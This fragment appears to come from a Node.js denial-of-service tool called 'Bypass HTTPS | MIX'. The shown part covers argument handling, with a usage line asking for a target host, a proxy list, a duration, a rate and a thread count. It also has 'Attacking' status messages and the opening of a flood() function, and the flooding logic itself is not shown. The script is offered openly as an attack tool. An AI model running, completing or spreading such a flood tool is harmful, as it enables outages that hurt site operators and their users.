...
if (process.argv.length < 8){
	console.log('	');
    console.log('		Bypass HTTPS | MIX '.green.bold);
	console.log('	');
    console.log('Usage: node file_name <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread>	');
...
const dateObj = new Date();
	...
	console.log('	Attacking | MIX');
    setTimeout(() => {
		console.log('	Attacking ended | MIX'.green.bold);
        process.exit(-1)
    }, process.argv[5] * 1000)
}else {
    function flood() {
